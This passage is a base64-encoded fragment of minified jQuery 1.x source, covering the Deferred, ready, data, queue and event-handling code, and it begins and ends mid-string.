W9uIChhKSB7IHZhciBiID0gMCwgYyA9IGQuY2FsbChhcmd1bWVudHMpLCBlID0gYy5sZW5ndGgsIGYgPSAxICE9PSBlIHx8IGEgJiYgbS5pc0Z1bmN0aW9uKGEucHJvbWlzZSkgPyBlIDogMCwgZyA9IDEgPT09IGYgPyBhIDogbS5EZWZlcnJlZCgpLCBoID0gZnVuY3Rpb24gKGEsIGIsIGMpIHsgcmV0dXJuIGZ1bmN0aW9uIChlKSB7IGJbYV0gPSB0aGlzLCBjW2FdID0gYXJndW1lbnRzLmxlbmd0aCA+IDEgPyBkLmNhbGwoYXJndW1lbnRzKSA6IGUsIGMgPT09IGkgPyBnLm5vdGlmeVdpdGgoYiwgYykgOiAtLWYgfHwgZy5yZXNvbHZlV2l0aChiLCBjKSB9IH0sIGksIGosIGs7IGlmIChlID4gMSkgZm9yIChpID0gbmV3IEFycmF5KGUpLCBqID0gbmV3IEFycmF5KGUpLCBrID0gbmV3IEFycmF5KGUpIDsgZSA+IGI7IGIrKykgY1tiXSAmJiBtLmlzRnVuY3Rpb24oY1tiXS5wcm9taXNlKSA/IGNbYl0ucHJvbWlzZSgpLmRvbmUoaChiLCBrLCBjKSkuZmFpbChnLnJlamVjdCkucHJvZ3Jlc3MoaChiLCBqLCBpKSkgOiAtLWY7IHJldHVybiBmIHx8IGcucmVzb2x2ZVdpdGgoaywgYyksIGcucHJvbWlzZSgpIH0gfSk7IHZhciBIOyBtLmZuLnJlYWR5ID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG0ucmVhZHkucHJvbWlzZSgpLmRvbmUoYSksIHRoaXMgfSwgbS5leHRlbmQoeyBpc1JlYWR5OiAhMSwgcmVhZHlXYWl0OiAxLCBob2xkUmVhZHk6IGZ1bmN0aW9uIChhKSB7IGEgPyBtLnJlYWR5V2FpdCsrIDogbS5yZWFkeSghMCkgfSwgcmVhZHk6IGZ1bmN0aW9uIChhKSB7IGlmIChhID09PSAhMCA/ICEtLW0ucmVhZHlXYWl0IDogIW0uaXNSZWFkeSkgeyBpZiAoIXkuYm9keSkgcmV0dXJuIHNldFRpbWVvdXQobS5yZWFkeSk7IG0uaXNSZWFkeSA9ICEwLCBhICE9PSAhMCAmJiAtLW0ucmVhZHlXYWl0ID4gMCB8fCAoSC5yZXNvbHZlV2l0aCh5LCBbbV0pLCBtLmZuLnRyaWdnZXJIYW5kbGVyICYmIChtKHkpLnRyaWdnZXJIYW5kbGVyKCJyZWFkeSIpLCBtKHkpLm9mZigicmVhZHkiKSkpIH0gfSB9KTsgZnVuY3Rpb24gSSgpIHsgeS5hZGRFdmVudExpc3RlbmVyID8gKHkucmVtb3ZlRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIEosICExKSwgYS5yZW1vdmVFdmVudExpc3RlbmVyKCJsb2FkIiwgSiwgITEpKSA6ICh5LmRldGFjaEV2ZW50KCJvbnJlYWR5c3RhdGVjaGFuZ2UiLCBKKSwgYS5kZXRhY2hFdmVudCgib25sb2FkIiwgSikpIH0gZnVuY3Rpb24gSigpIHsgKHkuYWRkRXZlbnRMaXN0ZW5lciB8fCAibG9hZCIgPT09IGV2ZW50LnR5cGUgfHwgImNvbXBsZXRlIiA9PT0geS5yZWFkeVN0YXRlKSAmJiAoSSgpLCBtLnJlYWR5KCkpIH0gbS5yZWFkeS5wcm9taXNlID0gZnVuY3Rpb24gKGIpIHsgaWYgKCFIKSBpZiAoSCA9IG0uRGVmZXJyZWQoKSwgImNvbXBsZXRlIiA9PT0geS5yZWFkeVN0YXRlKSBzZXRUaW1lb3V0KG0ucmVhZHkpOyBlbHNlIGlmICh5LmFkZEV2ZW50TGlzdGVuZXIpIHkuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIEosICExKSwgYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwgSiwgITEpOyBlbHNlIHsgeS5hdHRhY2hFdmVudCgib25yZWFkeXN0YXRlY2hhbmdlIiwgSiksIGEuYXR0YWNoRXZlbnQoIm9ubG9hZCIsIEopOyB2YXIgYyA9ICExOyB0cnkgeyBjID0gbnVsbCA9PSBhLmZyYW1lRWxlbWVudCAmJiB5LmRvY3VtZW50RWxlbWVudCB9IGNhdGNoIChkKSB7IH0gYyAmJiBjLmRvU2Nyb2xsICYmICFmdW5jdGlvbiBlKCkgeyBpZiAoIW0uaXNSZWFkeSkgeyB0cnkgeyBjLmRvU2Nyb2xsKCJsZWZ0IikgfSBjYXRjaCAoYSkgeyByZXR1cm4gc2V0VGltZW91dChlLCA1MCkgfSBJKCksIG0ucmVhZHkoKSB9IH0oKSB9IHJldHVybiBILnByb21pc2UoYikgfTsgdmFyIEsgPSAidW5kZWZpbmVkIiwgTDsgZm9yIChMIGluIG0oaykpIGJyZWFrOyBrLm93bkxhc3QgPSAiMCIgIT09IEwsIGsuaW5saW5lQmxvY2tOZWVkc0xheW91dCA9ICExLCBtKGZ1bmN0aW9uICgpIHsgdmFyIGEsIGIsIGMsIGQ7IGMgPSB5LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0sIGMgJiYgYy5zdHlsZSAmJiAoYiA9IHkuY3JlYXRlRWxlbWVudCgiZGl2IiksIGQgPSB5LmNyZWF0ZUVsZW1lbnQoImRpdiIpLCBkLnN0eWxlLmNzc1RleHQgPSAicG9zaXRpb246YWJzb2x1dGU7Ym9yZGVyOjA7d2lkdGg6MDtoZWlnaHQ6MDt0b3A6MDtsZWZ0Oi05OTk5cHgiLCBjLmFwcGVuZENoaWxkKGQpLmFwcGVuZENoaWxkKGIpLCB0eXBlb2YgYi5zdHlsZS56b29tICE9PSBLICYmIChiLnN0eWxlLmNzc1RleHQgPSAiZGlzcGxheTppbmxpbmU7bWFyZ2luOjA7Ym9yZGVyOjA7cGFkZGluZzoxcHg7d2lkdGg6MXB4O3pvb206MSIsIGsuaW5saW5lQmxvY2tOZWVkc0xheW91dCA9IGEgPSAzID09PSBiLm9mZnNldFdpZHRoLCBhICYmIChjLnN0eWxlLnpvb20gPSAxKSksIGMucmVtb3ZlQ2hpbGQoZCkpIH0pLCBmdW5jdGlvbiAoKSB7IHZhciBhID0geS5jcmVhdGVFbGVtZW50KCJkaXYiKTsgaWYgKG51bGwgPT0gay5kZWxldGVFeHBhbmRvKSB7IGsuZGVsZXRlRXhwYW5kbyA9ICEwOyB0cnkgeyBkZWxldGUgYS50ZXN0IH0gY2F0Y2ggKGIpIHsgay5kZWxldGVFeHBhbmRvID0gITEgfSB9IGEgPSBudWxsIH0oKSwgbS5hY2NlcHREYXRhID0gZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSBtLm5vRGF0YVsoYS5ub2RlTmFtZSArICIgIikudG9Mb3dlckNhc2UoKV0sIGMgPSArYS5ub2RlVHlwZSB8fCAxOyByZXR1cm4gMSAhPT0gYyAmJiA5ICE9PSBjID8gITEgOiAhYiB8fCBiICE9PSAhMCAmJiBhLmdldEF0dHJpYnV0ZSgiY2xhc3NpZCIpID09PSBiIH07IHZhciBNID0gL14oPzpce1tcd1xXXSpcfXxcW1tcd1xXXSpcXSkkLywgTiA9IC8oW0EtWl0pL2c7IGZ1bmN0aW9uIE8oYSwgYiwgYykgeyBpZiAodm9pZCAwID09PSBjICYmIDEgPT09IGEubm9kZVR5cGUpIHsgdmFyIGQgPSAiZGF0YS0iICsgYi5yZXBsYWNlKE4sICItJDEiKS50b0xvd2VyQ2FzZSgpOyBpZiAoYyA9IGEuZ2V0QXR0cmlidXRlKGQpLCAic3RyaW5nIiA9PSB0eXBlb2YgYykgeyB0cnkgeyBjID0gInRydWUiID09PSBjID8gITAgOiAiZmFsc2UiID09PSBjID8gITEgOiAibnVsbCIgPT09IGMgPyBudWxsIDogK2MgKyAiIiA9PT0gYyA/ICtjIDogTS50ZXN0KGMpID8gbS5wYXJzZUpTT04oYykgOiBjIH0gY2F0Y2ggKGUpIHsgfSBtLmRhdGEoYSwgYiwgYykgfSBlbHNlIGMgPSB2b2lkIDAgfSByZXR1cm4gYyB9IGZ1bmN0aW9uIFAoYSkgeyB2YXIgYjsgZm9yIChiIGluIGEpIGlmICgoImRhdGEiICE9PSBiIHx8ICFtLmlzRW1wdHlPYmplY3QoYVtiXSkpICYmICJ0b0pTT04iICE9PSBiKSByZXR1cm4gITE7IHJldHVybiAhMCB9IGZ1bmN0aW9uIFEoYSwgYiwgZCwgZSkgew0KICAgICAgICBpZiAobS5hY2NlcHREYXRhKGEpKSB7DQogICAgICAgICAgICB2YXIgZiwgZywgaCA9IG0uZXhwYW5kbywgaSA9IGEubm9kZVR5cGUsIGogPSBpID8gbS5jYWNoZSA6IGEsIGsgPSBpID8gYVtoXSA6IGFbaF0gJiYgaDsNCiAgICAgICAgICAgIGlmIChrICYmIGpba10gJiYgKGUgfHwgaltrXS5kYXRhKSB8fCB2b2lkIDAgIT09IGQgfHwgInN0cmluZyIgIT0gdHlwZW9mIGIpIHJldHVybiBrIHx8IChrID0gaSA/IGFbaF0gPSBjLnBvcCgpIHx8IG0uZ3VpZCsrIDogaCksIGpba10gfHwgKGpba10gPSBpID8ge30gOiB7IHRvSlNPTjogbS5ub29wIH0pLCAoIm9iamVjdCIgPT0gdHlwZW9mIGIgfHwgImZ1bmN0aW9uIiA9PSB0eXBlb2YgYikgJiYgKGUgPyBqW2tdID0gbS5leHRlbmQoaltrXSwgYikgOiBqW2tdLmRhdGEgPSBtLmV4dGVuZChqW2tdLmRhdGEsIGIpKSwgZyA9IGpba10sIGUgfHwgKGcuZGF0YSB8fCAoZy5kYXRhID0ge30pLCBnID0gZy5kYXRhKSwgdm9pZCAwICE9PSBkICYmIChnW20uY2FtZWxDYXNlKGIpXSA9IGQpLCAic3RyaW5nIiA9PSB0eXBlb2YgYiA/IChmID0gZ1tiXSwgbnVsbCA9PSBmICYmIChmID0gZ1ttLmNhbWVsQ2FzZShiKV0pKSA6IGYgPSBnLCBmDQogICAgICAgIH0NCiAgICB9IGZ1bmN0aW9uIFIoYSwgYiwgYykgeyBpZiAobS5hY2NlcHREYXRhKGEpKSB7IHZhciBkLCBlLCBmID0gYS5ub2RlVHlwZSwgZyA9IGYgPyBtLmNhY2hlIDogYSwgaCA9IGYgPyBhW20uZXhwYW5kb10gOiBtLmV4cGFuZG87IGlmIChnW2hdKSB7IGlmIChiICYmIChkID0gYyA/IGdbaF0gOiBnW2hdLmRhdGEpKSB7IG0uaXNBcnJheShiKSA/IGIgPSBiLmNvbmNhdChtLm1hcChiLCBtLmNhbWVsQ2FzZSkpIDogYiBpbiBkID8gYiA9IFtiXSA6IChiID0gbS5jYW1lbENhc2UoYiksIGIgPSBiIGluIGQgPyBbYl0gOiBiLnNwbGl0KCIgIikpLCBlID0gYi5sZW5ndGg7IHdoaWxlIChlLS0pIGRlbGV0ZSBkW2JbZV1dOyBpZiAoYyA/ICFQKGQpIDogIW0uaXNFbXB0eU9iamVjdChkKSkgcmV0dXJuIH0gKGMgfHwgKGRlbGV0ZSBnW2hdLmRhdGEsIFAoZ1toXSkpKSAmJiAoZiA/IG0uY2xlYW5EYXRhKFthXSwgITApIDogay5kZWxldGVFeHBhbmRvIHx8IGcgIT0gZy53aW5kb3cgPyBkZWxldGUgZ1toXSA6IGdbaF0gPSBudWxsKSB9IH0gfSBtLmV4dGVuZCh7IGNhY2hlOiB7fSwgbm9EYXRhOiB7ICJhcHBsZXQgIjogITAsICJlbWJlZCAiOiAhMCwgIm9iamVjdCAiOiAiY2xzaWQ6RDI3Q0RCNkUtQUU2RC0xMWNmLTk2QjgtNDQ0NTUzNTQwMDAwIiB9LCBoYXNEYXRhOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gYSA9IGEubm9kZVR5cGUgPyBtLmNhY2hlW2FbbS5leHBhbmRvXV0gOiBhW20uZXhwYW5kb10sICEhYSAmJiAhUChhKSB9LCBkYXRhOiBmdW5jdGlvbiAoYSwgYiwgYykgeyByZXR1cm4gUShhLCBiLCBjKSB9LCByZW1vdmVEYXRhOiBmdW5jdGlvbiAoYSwgYikgeyByZXR1cm4gUihhLCBiKSB9LCBfZGF0YTogZnVuY3Rpb24gKGEsIGIsIGMpIHsgcmV0dXJuIFEoYSwgYiwgYywgITApIH0sIF9yZW1vdmVEYXRhOiBmdW5jdGlvbiAoYSwgYikgeyByZXR1cm4gUihhLCBiLCAhMCkgfSB9KSwgbS5mbi5leHRlbmQoeyBkYXRhOiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYywgZCwgZSwgZiA9IHRoaXNbMF0sIGcgPSBmICYmIGYuYXR0cmlidXRlczsgaWYgKHZvaWQgMCA9PT0gYSkgeyBpZiAodGhpcy5sZW5ndGggJiYgKGUgPSBtLmRhdGEoZiksIDEgPT09IGYubm9kZVR5cGUgJiYgIW0uX2RhdGEoZiwgInBhcnNlZEF0dHJzIikpKSB7IGMgPSBnLmxlbmd0aDsgd2hpbGUgKGMtLSkgZ1tjXSAmJiAoZCA9IGdbY10ubmFtZSwgMCA9PT0gZC5pbmRleE9mKCJkYXRhLSIpICYmIChkID0gbS5jYW1lbENhc2UoZC5zbGljZSg1KSksIE8oZiwgZCwgZVtkXSkpKTsgbS5fZGF0YShmLCAicGFyc2VkQXR0cnMiLCAhMCkgfSByZXR1cm4gZSB9IHJldHVybiAib2JqZWN0IiA9PSB0eXBlb2YgYSA/IHRoaXMuZWFjaChmdW5jdGlvbiAoKSB7IG0uZGF0YSh0aGlzLCBhKSB9KSA6IGFyZ3VtZW50cy5sZW5ndGggPiAxID8gdGhpcy5lYWNoKGZ1bmN0aW9uICgpIHsgbS5kYXRhKHRoaXMsIGEsIGIpIH0pIDogZiA/IE8oZiwgYSwgbS5kYXRhKGYsIGEpKSA6IHZvaWQgMCB9LCByZW1vdmVEYXRhOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uICgpIHsgbS5yZW1vdmVEYXRhKHRoaXMsIGEpIH0pIH0gfSksIG0uZXh0ZW5kKHsgcXVldWU6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHZhciBkOyByZXR1cm4gYSA/IChiID0gKGIgfHwgImZ4IikgKyAicXVldWUiLCBkID0gbS5fZGF0YShhLCBiKSwgYyAmJiAoIWQgfHwgbS5pc0FycmF5KGMpID8gZCA9IG0uX2RhdGEoYSwgYiwgbS5tYWtlQXJyYXkoYykpIDogZC5wdXNoKGMpKSwgZCB8fCBbXSkgOiB2b2lkIDAgfSwgZGVxdWV1ZTogZnVuY3Rpb24gKGEsIGIpIHsgYiA9IGIgfHwgImZ4IjsgdmFyIGMgPSBtLnF1ZXVlKGEsIGIpLCBkID0gYy5sZW5ndGgsIGUgPSBjLnNoaWZ0KCksIGYgPSBtLl9xdWV1ZUhvb2tzKGEsIGIpLCBnID0gZnVuY3Rpb24gKCkgeyBtLmRlcXVldWUoYSwgYikgfTsgImlucHJvZ3Jlc3MiID09PSBlICYmIChlID0gYy5zaGlmdCgpLCBkLS0pLCBlICYmICgiZngiID09PSBiICYmIGMudW5zaGlmdCgiaW5wcm9ncmVzcyIpLCBkZWxldGUgZi5zdG9wLCBlLmNhbGwoYSwgZywgZikpLCAhZCAmJiBmICYmIGYuZW1wdHkuZmlyZSgpIH0sIF9xdWV1ZUhvb2tzOiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYyA9IGIgKyAicXVldWVIb29rcyI7IHJldHVybiBtLl9kYXRhKGEsIGMpIHx8IG0uX2RhdGEoYSwgYywgeyBlbXB0eTogbS5DYWxsYmFja3MoIm9uY2UgbWVtb3J5IikuYWRkKGZ1bmN0aW9uICgpIHsgbS5fcmVtb3ZlRGF0YShhLCBiICsgInF1ZXVlIiksIG0uX3JlbW92ZURhdGEoYSwgYykgfSkgfSkgfSB9KSwgbS5mbi5leHRlbmQoeyBxdWV1ZTogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSAyOyByZXR1cm4gInN0cmluZyIgIT0gdHlwZW9mIGEgJiYgKGIgPSBhLCBhID0gImZ4IiwgYy0tKSwgYXJndW1lbnRzLmxlbmd0aCA8IGMgPyBtLnF1ZXVlKHRoaXNbMF0sIGEpIDogdm9pZCAwID09PSBiID8gdGhpcyA6IHRoaXMuZWFjaChmdW5jdGlvbiAoKSB7IHZhciBjID0gbS5xdWV1ZSh0aGlzLCBhLCBiKTsgbS5fcXVldWVIb29rcyh0aGlzLCBhKSwgImZ4IiA9PT0gYSAmJiAiaW5wcm9ncmVzcyIgIT09IGNbMF0gJiYgbS5kZXF1ZXVlKHRoaXMsIGEpIH0pIH0sIGRlcXVldWU6IGZ1bmN0aW9uIChhKSB7IHJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24gKCkgeyBtLmRlcXVldWUodGhpcywgYSkgfSkgfSwgY2xlYXJRdWV1ZTogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHRoaXMucXVldWUoYSB8fCAiZngiLCBbXSkgfSwgcHJvbWlzZTogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMsIGQgPSAxLCBlID0gbS5EZWZlcnJlZCgpLCBmID0gdGhpcywgZyA9IHRoaXMubGVuZ3RoLCBoID0gZnVuY3Rpb24gKCkgeyAtLWQgfHwgZS5yZXNvbHZlV2l0aChmLCBbZl0pIH07ICJzdHJpbmciICE9IHR5cGVvZiBhICYmIChiID0gYSwgYSA9IHZvaWQgMCksIGEgPSBhIHx8ICJmeCI7IHdoaWxlIChnLS0pIGMgPSBtLl9kYXRhKGZbZ10sIGEgKyAicXVldWVIb29rcyIpLCBjICYmIGMuZW1wdHkgJiYgKGQrKywgYy5lbXB0eS5hZGQoaCkpOyByZXR1cm4gaCgpLCBlLnByb21pc2UoYikgfSB9KTsgdmFyIFMgPSAvWystXT8oPzpcZCpcLnwpXGQrKD86W2VFXVsrLV0/XGQrfCkvLnNvdXJjZSwgVCA9IFsiVG9wIiwgIlJpZ2h0IiwgIkJvdHRvbSIsICJMZWZ0Il0sIFUgPSBmdW5jdGlvbiAoYSwgYikgeyByZXR1cm4gYSA9IGIgfHwgYSwgIm5vbmUiID09PSBtLmNzcyhhLCAiZGlzcGxheSIpIHx8ICFtLmNvbnRhaW5zKGEub3duZXJEb2N1bWVudCwgYSkgfSwgViA9IG0uYWNjZXNzID0gZnVuY3Rpb24gKGEsIGIsIGMsIGQsIGUsIGYsIGcpIHsgdmFyIGggPSAwLCBpID0gYS5sZW5ndGgsIGogPSBudWxsID09IGM7IGlmICgib2JqZWN0IiA9PT0gbS50eXBlKGMpKSB7IGUgPSAhMDsgZm9yIChoIGluIGMpIG0uYWNjZXNzKGEsIGIsIGgsIGNbaF0sICEwLCBmLCBnKSB9IGVsc2UgaWYgKHZvaWQgMCAhPT0gZCAmJiAoZSA9ICEwLCBtLmlzRnVuY3Rpb24oZCkgfHwgKGcgPSAhMCksIGogJiYgKGcgPyAoYi5jYWxsKGEsIGQpLCBiID0gbnVsbCkgOiAoaiA9IGIsIGIgPSBmdW5jdGlvbiAoYSwgYiwgYykgeyByZXR1cm4gai5jYWxsKG0oYSksIGMpIH0pKSwgYikpIGZvciAoOyBpID4gaDsgaCsrKSBiKGFbaF0sIGMsIGcgPyBkIDogZC5jYWxsKGFbaF0sIGgsIGIoYVtoXSwgYykpKTsgcmV0dXJuIGUgPyBhIDogaiA/IGIuY2FsbChhKSA6IGkgPyBiKGFbMF0sIGMpIDogZiB9LCBXID0gL14oPzpjaGVja2JveHxyYWRpbykkL2k7ICFmdW5jdGlvbiAoKSB7IHZhciBhID0geS5jcmVhdGVFbGVtZW50KCJpbnB1dCIpLCBiID0geS5jcmVhdGVFbGVtZW50KCJkaXYiKSwgYyA9IHkuY3JlYXRlRG9jdW1lbnRGcmFnbWVudCgpOyBpZiAoYi5pbm5lckhUTUwgPSAiICA8bGluay8+PHRhYmxlPjwvdGFibGU+PGEgaHJlZj0nL2EnPmE8L2E+PGlucHV0IHR5cGU9J2NoZWNrYm94Jy8+Iiwgay5sZWFkaW5nV2hpdGVzcGFjZSA9IDMgPT09IGIuZmlyc3RDaGlsZC5ub2RlVHlwZSwgay50Ym9keSA9ICFiLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJ0Ym9keSIpLmxlbmd0aCwgay5odG1sU2VyaWFsaXplID0gISFiLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJsaW5rIikubGVuZ3RoLCBrLmh0bWw1Q2xvbmUgPSAiPDpuYXY+PC86bmF2PiIgIT09IHkuY3JlYXRlRWxlbWVudCgibmF2IikuY2xvbmVOb2RlKCEwKS5vdXRlckhUTUwsIGEudHlwZSA9ICJjaGVja2JveCIsIGEuY2hlY2tlZCA9ICEwLCBjLmFwcGVuZENoaWxkKGEpLCBrLmFwcGVuZENoZWNrZWQgPSBhLmNoZWNrZWQsIGIuaW5uZXJIVE1MID0gIjx0ZXh0YXJlYT54PC90ZXh0YXJlYT4iLCBrLm5vQ2xvbmVDaGVja2VkID0gISFiLmNsb25lTm9kZSghMCkubGFzdENoaWxkLmRlZmF1bHRWYWx1ZSwgYy5hcHBlbmRDaGlsZChiKSwgYi5pbm5lckhUTUwgPSAiPGlucHV0IHR5cGU9J3JhZGlvJyBjaGVja2VkPSdjaGVja2VkJyBuYW1lPSd0Jy8+Iiwgay5jaGVja0Nsb25lID0gYi5jbG9uZU5vZGUoITApLmNsb25lTm9kZSghMCkubGFzdENoaWxkLmNoZWNrZWQsIGsubm9DbG9uZUV2ZW50ID0gITAsIGIuYXR0YWNoRXZlbnQgJiYgKGIuYXR0YWNoRXZlbnQoIm9uY2xpY2siLCBmdW5jdGlvbiAoKSB7IGsubm9DbG9uZUV2ZW50ID0gITEgfSksIGIuY2xvbmVOb2RlKCEwKS5jbGljaygpKSwgbnVsbCA9PSBrLmRlbGV0ZUV4cGFuZG8pIHsgay5kZWxldGVFeHBhbmRvID0gITA7IHRyeSB7IGRlbGV0ZSBiLnRlc3QgfSBjYXRjaCAoZCkgeyBrLmRlbGV0ZUV4cGFuZG8gPSAhMSB9IH0gfSgpLCBmdW5jdGlvbiAoKSB7IHZhciBiLCBjLCBkID0geS5jcmVhdGVFbGVtZW50KCJkaXYiKTsgZm9yIChiIGluIHsgc3VibWl0OiAhMCwgY2hhbmdlOiAhMCwgZm9jdXNpbjogITAgfSkgYyA9ICJvbiIgKyBiLCAoa1tiICsgIkJ1YmJsZXMiXSA9IGMgaW4gYSkgfHwgKGQuc2V0QXR0cmlidXRlKGMsICJ0IiksIGtbYiArICJCdWJibGVzIl0gPSBkLmF0dHJpYnV0ZXNbY10uZXhwYW5kbyA9PT0gITEpOyBkID0gbnVsbCB9KCk7IHZhciBYID0gL14oPzppbnB1dHxzZWxlY3R8dGV4dGFyZWEpJC9pLCBZID0gL15rZXkvLCBaID0gL14oPzptb3VzZXxwb2ludGVyfGNvbnRleHRtZW51KXxjbGljay8sICQgPSAvXig/OmZvY3VzaW5mb2N1c3xmb2N1c291dGJsdXIpJC8sIF8gPSAvXihbXi5dKikoPzpcLiguKyl8KSQvOyBmdW5jdGlvbiBhYigpIHsgcmV0dXJuICEwIH0gZnVuY3Rpb24gYmIoKSB7IHJldHVybiAhMSB9IGZ1bmN0aW9uIGNiKCkgeyB0cnkgeyByZXR1cm4geS5hY3RpdmVFbGVtZW50IH0gY2F0Y2ggKGEpIHsgfSB9IG0uZXZlbnQgPSB7IGdsb2JhbDoge30sIGFkZDogZnVuY3Rpb24gKGEsIGIsIGMsIGQsIGUpIHsgdmFyIGYsIGcsIGgsIGksIGosIGssIGwsIG4sIG8sIHAsIHEsIHIgPSBtLl9kYXRhKGEpOyBpZiAocikgeyBjLmhhbmRsZXIgJiYgKGkgPSBjLCBjID0gaS5oYW5kbGVyLCBlID0gaS5zZWxlY3RvciksIGMuZ3VpZCB8fCAoYy5ndWlkID0gbS5ndWlkKyspLCAoZyA9IHIuZXZlbnRzKSB8fCAoZyA9IHIuZXZlbnRzID0ge30pLCAoayA9IHIuaGFuZGxlKSB8fCAoayA9IHIuaGFuZGxlID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHR5cGVvZiBtID09PSBLIHx8IGEgJiYgbS5ldmVudC50cmlnZ2VyZWQgPT09IGEudHlwZSA/IHZvaWQgMCA6IG0uZXZlbnQuZGlzcGF0Y2guYXBwbHkoay5lbGVtLCBhcmd1bWVudHMpIH0sIGsuZWxlbSA9IGEpLCBiID0gKGIgfHwgIiIpLm1hdGNoKEUpIHx8IFsiIl0sIGggPSBiLmxlbmd0aDsgd2hpbGUgKGgtLSkgZiA9IF8uZXhlYyhiW2hdKSB8fCBbXSwgbyA9IHEgPSBmWzFdLCBwID0gKGZbMl0gfHwgIiIpLnNwbGl0KCIuIikuc29ydCgpLCBvICYmIChqID0gbS5ldmVudC5zcGVjaWFsW29dIHx8IHt9LCBvID0gKGUgPyBqLmRlbGVnYXRlVHlwZSA6IGouYmluZFR5cGUpIHx8IG8sIGogPSBtLmV2ZW50LnNwZWNpYWxbb10gfHwge30sIGwgPSBtLmV4dGVuZCh7IHR5cGU6IG8sIG9yaWdUeXBlOiBxLCBkYXRhOiBkLCBoYW5kbGVyOiBjLCBndWlkOiBjLmd1aWQsIHNlbGVjdG9yOiBlLCBuZWVkc0NvbnRleHQ6IGUgJiYgbS5leHByLm1hdGNoLm5lZWRzQ29udGV4dC50ZXN0KGUpLCBuYW1lc3BhY2U6IHAuam9pbigiLiIpIH0sIGkpLCAobiA9IGdbb10pIHx8IChuID0gZ1tvXSA9IFtdLCBuLmRlbGVnYXRlQ291bnQgPSAwLCBqLnNldHVwICYmIGouc2V0dXAuY2FsbChhLCBkLCBwLCBrKSAhPT0gITEgfHwgKGEuYWRkRXZlbnRMaXN0ZW5lciA/IGEuYWRkRXZlbnRMaXN0ZW5lcihvLCBrLCAhMSkgOiBhLmF0dGFjaEV2ZW50ICYmIGEuYXR0YWNoRXZlbnQoIm9uIiArIG8sIGspKSksIGouYWRkICYmIChqLmFkZC5jYWxsKGEsIGwpLCBsLmhhbmRsZXIuZ3VpZCB8fCAobC5oYW5kbGVyLmd1aWQgPSBjLmd1aWQpKSwgZSA/IG4uc3BsaWNlKG4uZGVsZWdhdGVDb3VudCsrLCAwLCBsKSA6IG4ucHVzaChsKSwgbS5ldmVudC5nbG9iYWxbb10gPSAhMCk7IGEgPSBudWxsIH0gfSwgcmVtb3ZlOiBmdW5jdGlvbiAoYSwgYiwgYywgZCwgZSkgeyB2YXIgZiwgZywgaCwgaSwgaiwgaywgbCwgbiwgbywgcCwgcSwgciA9IG0uaGFzRGF0YShhKSAmJiBtLl9kYXRhKGEpOyBpZiAociAmJiAoayA9IHIuZXZlbnRzKSkgeyBiID0gKGIgfHwgIiIpLm1hdGNoKEUpIHx8IFsiIl0sIGogPSBiLmxlbmd0aDsgd2hpbGUgKGotLSkgaWYgKGggPSBfLmV4ZWMoYltqXSkgfHwgW10sIG8gPSBxID0gaFsxXSwgcCA9IChoWzJdIHx8ICIiKS5zcGxpdCgiLiIpLnNvcnQoKSwgbykgeyBsID0gbS5ldmVudC5zcGVjaWFsW29dIHx8IHt9LCBvID0gKGQgPyBsLmRlbGVnYXRlVHlwZSA6IGwuYmluZFR5cGUpIHx8IG8sIG4gPSBrW29dIHx8IFtdLCBoID0gaFsyXSAmJiBuZXcgUmVnRXhwKCIoXnxcXC4pIiArIHAuam9pbigiXFwuKD86LipcXC58KSIpICsgIihcXC58JCkiKSwgaSA9IGYgPSBuLmxlbmd0aDsgd2hpbGUgKGYtLSkgZyA9IG5bZl0sICFlICYmIHEgIT09IGcub3JpZ1R5cGUgfHwgYyAmJiBjLmd1aWQgIT09IGcuZ3VpZCB8fCBoICYmICFoLnRlc3QoZy5uYW1lc3BhY2UpIHx8IGQgJiYgZCAhPT0gZy5zZWxlY3RvciAmJiAoIioqIiAhPT0gZCB8fCAhZy5zZWxlY3RvcikgfHwgKG4uc3BsaWNlKGYsIDEpLCBnLnNlbGVjdG9yICYmIG4uZGVsZWdhdGVDb3VudC0tLCBsLnJlbW92ZSAmJiBsLnJlbW92ZS5jYWxsKGEsIGcpKTsgaSAmJiAhbi5sZW5ndGggJiYgKGwudGVhcmRvd24gJiYgbC50ZWFyZG93bi5jYWxsKGEsIHAsIHIuaGFuZGxlKSAhPT0gITEgfHwgbS5yZW1vdmVFdmVudChhLCBvLCByLmhhbmRsZSksIGRlbGV0ZSBrW29dKSB9IGVsc2UgZm9yIChvIGluIGspIG0uZXZlbnQucmVtb3ZlKGEsIG8gKyBiW2pdLCBjLCBkLCAhMCk7IG0uaXNFbXB0eU9iamVjdChrKSAmJiAoZGVsZXRlIHIuaGFuZGxlLCBtLl9yZW1vdmVEYXRhKGEsICJldmVudHMiKSkgfSB9LCB0cmlnZ2VyOiBmdW5jdGlvbiAoYiwgYywgZCwgZSkgeyB2YXIgZiwgZywgaCwgaSwgaywgbCwgbiwgbyA9IFtkIHx8IHldLCBwID0gai5jYWxsKGIsICJ0eXBlIikgPyBiLnR5cGUgOiBiLCBxID0gai5jYWxsKGIsICJuYW1lc3BhY2UiKSA/IGIubmFtZXNwYWNlLnNwbGl0KCIuIikgOiBbXTsgaWYgKGggPSBsID0gZCA9IGQgfHwgeSwgMyAhPT0gZC5ub2RlVHlwZSAmJiA4ICE9PSBkLm5vZGVUeXBlICYmICEkLnRlc3QocCArIG0uZXZlbnQudHJpZ2dlcmVkKSAmJiAocC5pbmRleE9mKCIuIikgPj0gMCAmJiAocSA9IHAuc3BsaXQoIi4iKSwgcCA9IHEuc2hpZnQoKSwgcS5zb3J0KCkpLCBnID0gcC5pbmRleE9mKCI6IikgPCAwICYmICJvbiIgKyBwLCBiID0gYlttLmV4